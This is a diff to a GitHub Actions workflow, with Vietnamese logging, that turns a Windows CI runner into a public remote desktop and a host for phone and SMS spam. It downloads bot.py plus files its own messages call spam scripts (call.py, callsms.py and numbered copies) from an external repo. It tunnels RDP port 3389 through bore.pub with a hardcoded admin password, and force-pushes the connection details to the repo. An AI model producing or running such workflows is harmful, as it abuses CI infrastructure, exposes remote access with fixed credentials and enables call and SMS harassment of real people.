@@ -37,7 +37,18 @@ jobs:
       - name: 🛠️ Setup Logging Helper
         shell: cmd
         run: |
-          powershell -ExecutionPolicy Bypass -Command "$code = @'\nparam([string]$message)\nWrite-Host \"[SYSTEM LOG]: $message\"\n$serverUrl = \"${{ github.event.inputs.server_url }}\"\n$machineId = \"${{ github.event.inputs.machine_id }}\"\nif ($serverUrl -and $machineId) {\n  try {\n    $body = @{ machineId = $machineId; message = $message } | ConvertTo-Json -Compress\n    Invoke-RestMethod -Uri \"$serverUrl/api/machine-log\" -Method Post -Body $body -ContentType \"application/json\" -TimeoutSec 10 | Out-Null\n  } catch {\n    Write-Host \"Failed to report log to server: $_\"\n  }\n}\n'@\n$code | Out-File -FilePath 'report-log.ps1' -Encoding UTF8"
+          > report-log.ps1 echo param([string]$message)
+          >> report-log.ps1 echo Write-Host "[SYSTEM LOG]: $message"
+          >> report-log.ps1 echo $serverUrl = "${{ github.event.inputs.server_url }}"
+          >> report-log.ps1 echo $machineId = "${{ github.event.inputs.machine_id }}"
+          >> report-log.ps1 echo if ($serverUrl -and $machineId) {
+          >> report-log.ps1 echo   try {
+          >> report-log.ps1 echo     $body = @{ machineId = $machineId; message = $message } ^| ConvertTo-Json -Compress
+          >> report-log.ps1 echo     Invoke-RestMethod -Uri "$serverUrl/api/machine-log" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10 ^| Out-Null
+          >> report-log.ps1 echo   } catch {
+          >> report-log.ps1 echo     Write-Host "Failed to report log to server: $_"
+          >> report-log.ps1 echo   }
+          >> report-log.ps1 echo }
 
       - name: 📦 Install Python Dependencies
         shell: cmd
@@ -73,7 +84,7 @@ jobs:
         shell: cmd
         run: |
           powershell -ExecutionPolicy Bypass -File report-log.ps1 "📥 Đang tải bot.py + các file spam (call.py->call5.py, callsms.py->callsms11.py) từ repo..."
-          powershell -ExecutionPolicy Bypass -Command "$baseRaw = 'https://raw.githubusercontent.com/Vhjkjfftf56774njjkkkjdss/Vhjkjfftf56774njjkkkj-/main'; $files = @('bot.py'); $files += @('call.py') + (2..5 | ForEach-Object { \"call$_.py\" }); $files += @('callsms.py') + (2..11 | ForEach-Object { \"callsms$_.py\" }); $ok = @(); $miss = @(); foreach ($f in $files) { try { Invoke-WebRequest -Uri \"$baseRaw/$f\" -OutFile $f -TimeoutSec 30 -ErrorAction Stop; $size = (Get-Item $f).Length; Write-Host \"[DL] OK: $f ($size bytes)\"; $ok += $f } catch { Write-Host \"[DL] MISS: $f - $($_.Exception.Message)\"; $miss += $f } }; Write-Host \"[DL] Tai thanh cong $($ok.Count)/$($files.Count) file\"; if ($miss.Count -gt 0) { powershell -ExecutionPolicy Bypass -File report-log.ps1 \"⚠️ Tải $($ok.Count)/$($files.Count) file, thiếu: $($miss -join ', ')\" } else { powershell -ExecutionPolicy Bypass -File report-log.ps1 \"✅ Đã tải đủ $($ok.Count) file (bot.py + call.py->call5.py + callsms.py->callsms11.py).\" }"
+          powershell -ExecutionPolicy Bypass -Command "$baseRaw = 'https://raw.githubusercontent.com/Vhjkjfftf56774njjkkkjdss/Vhjkjfftf56774njjkkkj-/main'; $files = @('bot.py'); $files += @('call.py') + (2..5 | ForEach-Object { \"call$_.py\" }); $files += @('callsms.py') + (2..11 | ForEach-Object { \"callsms$_.py\" }); $ok = @(); $miss = @(); foreach ($f in $files) { try { Invoke-WebRequest -Uri \"$baseRaw/$f\" -OutFile $f -TimeoutSec 30 -ErrorAction Stop; $size = (Get-Item $f).Length; Write-Host \"[DL] OK: $f ($size bytes)\"; $ok += $f } catch { Write-Host \"[DL] MISS: $f - $($_.Exception.Message)\"; $miss += $f } }; Write-Host \"[DL] Tai thanh cong $($ok.Count)/$($files.Count) file\"; if ($miss.Count -gt 0) { powershell -ExecutionPolicy Bypass -File report-log.ps1 \"Canh bao: Tai $($ok.Count)/$($files.Count) file, thieu: $($miss -join ', ')\" } else { powershell -ExecutionPolicy Bypass -File report-log.ps1 \"Da tai du $($ok.Count) file\" }"
 
       - name: 🌐 Set UTF-8 Encoding
         shell: cmd
@@ -112,4 +123,37 @@ jobs:
 
           powershell -ExecutionPolicy Bypass -File report-log.ps1 "🔍 Đang kết nối Bore Server..."
 
-          powershell -ExecutionPolicy Bypass -Command "$PASS = 'WindowsRDP2026@'; $USER = 'admin'; $lastFullAddress = ''; $psi = New-Object System.Diagnostics.ProcessStartInfo; $psi.FileName = '.\bore\bore.exe'; $psi.Arguments = 'local 3389 --to bore.pub'; $psi.UseShellExecute = $false; $psi.RedirectStandardOutput = $true; $process = [System.Diagnostics.Process]::Start($psi); while (!$process.HasExited) { $line = $process.StandardOutput.ReadLine(); if ($line) { Write-Host \"[bore] $line\" }; if ($line -match '(?:listening at|remote forwarding at) (bore\.pub:\d+)') { $fullAddress = $matches[1]; $portOnly = $fullAddress.Split(':')[1]; if ($fullAddress -ne $lastFullAddress) { $lastFullAddress = $fullAddress; powershell -ExecutionPolicy Bypass -File report-log.ps1 \"✅ Mở port RDP thành công trên Bore: $fullAddress\"; if (Test-Path 'rdp_info.txt') { Remove-Item 'rdp_info.txt' -Force }; $createdAt = (Get-Date).ToString('HH:mm:ss dd/MM/yyyy'); $reportLines = @('=======================================================','RDP INFO - DucThang x TrueHieu Edition','=======================================================',\"FULL ADDRESS   : $fullAddress\",\"PORT           : $portOnly\",'HOST           : bore.pub','-------------------------------------------------------',\"Username       : $USER\",\"Password       : $PASS\",\"Created        : $createdAt\",'======================================================='); $report = ($reportLines -join \"`r`n\"); [System.IO.File]::WriteAllText(\"$(Get-Location)\rdp_info.txt\", $report); git checkout main; git add rdp_info.txt; git commit -m \"Update RDP: $portOnly [skip ci]\"; git push origin main --force; powershell -ExecutionPolicy Bypass -File report-log.ps1 \"✅ Đã commit thông tin RDP lên repo: $fullAddress\" } }; Start-Sleep -Milliseconds 200 }"
+          > bore-monitor.ps1 echo $PASS = "WindowsRDP2026@"
+          >> bore-monitor.ps1 echo $USER = "admin"
+          >> bore-monitor.ps1 echo $lastFullAddress = ""
+          >> bore-monitor.ps1 echo $psi = New-Object System.Diagnostics.ProcessStartInfo
+          >> bore-monitor.ps1 echo $psi.FileName = ".\bore\bore.exe"
+          >> bore-monitor.ps1 echo $psi.Arguments = "local 3389 --to bore.pub"
+          >> bore-monitor.ps1 echo $psi.UseShellExecute = $false
+          >> bore-monitor.ps1 echo $psi.RedirectStandardOutput = $true
+          >> bore-monitor.ps1 echo $process = [System.Diagnostics.Process]::Start($psi)
+          >> bore-monitor.ps1 echo while (!$process.HasExited) {
+          >> bore-monitor.ps1 echo     $line = $process.StandardOutput.ReadLine()
+          >> bore-monitor.ps1 echo     if ($line) { Write-Host "[bore] $line" }
+          >> bore-monitor.ps1 echo     if ($line -match "(?:listening at^|remote forwarding at) (bore\.pub:\d+)") {
+          >> bore-monitor.ps1 echo         $fullAddress = $matches[1]
+          >> bore-monitor.ps1 echo         $portOnly = $fullAddress.Split(':')[1]
+          >> bore-monitor.ps1 echo         if ($fullAddress -ne $lastFullAddress) {
+          >> bore-monitor.ps1 echo             $lastFullAddress = $fullAddress
+          >> bore-monitor.ps1 echo             powershell -ExecutionPolicy Bypass -File report-log.ps1 "Mo port RDP thanh cong: $fullAddress"
+          >> bore-monitor.ps1 echo             if (Test-Path "rdp_info.txt") { Remove-Item "rdp_info.txt" -Force }
+          >> bore-monitor.ps1 echo             $createdAt = (Get-Date).ToString('HH:mm:ss dd/MM/yyyy')
+          >> bore-monitor.ps1 echo             $reportLines = @('=======================================================','RDP INFO - DucThang x TrueHieu Edition','=======================================================',"FULL ADDRESS   : $fullAddress","PORT           : $portOnly",'HOST           : bore.pub','-------------------------------------------------------',"Username       : $USER","Password       : $PASS","Created        : $createdAt",'=======================================================')
+          >> bore-monitor.ps1 echo             $report = ($reportLines -join "`r`n")
+          >> bore-monitor.ps1 echo             [System.IO.File]::WriteAllText("$(Get-Location)\rdp_info.txt", $report)
+          >> bore-monitor.ps1 echo             git checkout main
+          >> bore-monitor.ps1 echo             git add rdp_info.txt
+          >> bore-monitor.ps1 echo             git commit -m "Update RDP: $portOnly [skip ci]"
+          >> bore-monitor.ps1 echo             git push origin main --force
+          >> bore-monitor.ps1 echo             powershell -ExecutionPolicy Bypass -File report-log.ps1 "Da commit RDP len repo: $fullAddress"
+          >> bore-monitor.ps1 echo         }
+          >> bore-monitor.ps1 echo     }
+          >> bore-monitor.ps1 echo     Start-Sleep -Milliseconds 200
+          >> bore-monitor.ps1 echo }
+
+          powershell -ExecutionPolicy Bypass -File bore-monitor.ps1
